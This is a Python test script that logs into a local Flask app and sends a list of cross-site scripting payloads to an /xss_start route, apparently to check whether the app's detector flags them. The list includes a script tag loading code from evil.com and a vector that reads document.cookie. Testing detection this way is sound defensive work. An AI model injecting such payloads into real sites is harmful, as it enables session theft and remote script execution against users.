# test_xss.py

import requests

# Base URL for the Flask app
# Make sure python app.py is running in a separate terminal before running this
BASE_URL = "http://localhost:5000"

# Create a session object so the login cookie carries over to all requests
session = requests.Session()

# Step 1 - Login to get a valid session cookie
login = session.post(BASE_URL + "/", data={
    "username": "your_username",
    "password": "your_password"
})
print("Login Status Code:", login.status_code)

# define test payloads 
xss_payloads = [
    # Basic script tag - should be detected
    "<script>alert(1)</script>",

    # Script tag with src - should be detected
    "<script src='http://evil.com/xss.js'></script>",

    # Javascript protocol - should be detected
    "javascript:alert(document.cookie)",

    # onerror event on image tag - should be detected
    "<img src=x onerror=alert(1)>",

    # onload event - should be detected
    "<body onload[]=alert(1)>",

    # SVG based XSS - should be detected
    "<svg/onload=alert(1)>",

    # Normal input - should NOT trigger XSS
    "hello world this is normal text",

    # Normal HTML that is not malicious - should NOT trigger XSS
    "<p>This is a normal paragraph</p>"
]

# Run each payload through the xss_start route
for payload in xss_payloads:
    print(f"\nTesting payload: {payload}")

    xss_test = session.post(BASE_URL + "/xss_start", json={
        # Replace with a real target_id from your MongoDB targets collection
        # Or temporarily hardcode the target in xssroutes.py for testing
        "target_id": "000000000000000000000001",
        "payload": payload
    })

    print("Status Code:", xss_test.status_code)

    # Try to parse and print the JSON response from the route
    try:
        result = xss_test.json()
        print("Vulnerability Detected:", result.get("vulnerability"))
        print("Log:")
        # Print each step of the attack log on its own line
        for log_entry in result.get("xss_log", []):
            print("  -", log_entry)
    except Exception as e:
        print("Could not parse response:", e)
        print("Raw response:", xss_test.text)